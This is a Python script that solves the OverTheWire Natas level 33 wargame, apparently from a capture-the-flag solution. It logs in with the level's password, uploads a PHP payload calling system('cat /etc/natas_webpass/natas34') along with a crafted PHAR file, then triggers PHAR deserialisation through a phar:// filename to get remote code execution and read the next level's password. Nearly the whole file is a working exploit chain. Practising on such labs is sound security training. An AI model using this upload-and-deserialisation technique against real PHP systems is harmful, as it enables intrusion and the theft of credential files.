import requests
import subprocess

url = "http://natas33.natas.labs.overthewire.org"

s = requests.Session()
s.auth = ('natas33', '2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ')

# create rce payload
payload = "<?php system('cat /etc/natas_webpass/natas34') ?>"
filename = 'payload.php'

with open(filename, 'w') as f:
    f.write(payload)

# create phar payload
subprocess.run(['php', '-d', 'phar.readonly=0', 'exploit.php'])
print("> Created payload")

# upload payload
res = s.post(
    f"{url}/index.php",
    data={ "filename": filename },
    files={"uploadedfile": (filename, payload, "application/octet-stream")}
)

print("> RCE payload uploaded")

with open("exploit.phar", "rb") as f:
    res = s.post(
        f"{url}/index.php",
        data={ "filename": 'exploit.phar' },
        files={"uploadedfile": ('exploit.phar', f.read(), "application/octet-stream")}
    )

print("> PHAR payload uploaded")

# trigger deserialisation
res = s.post(
    f'{url}/index.php', 
    data={ 'filename': 'phar://exploit.phar' },
    files={ 'uploadedfile': ('a', 'a', 'text/plain')}
)

print(res.text)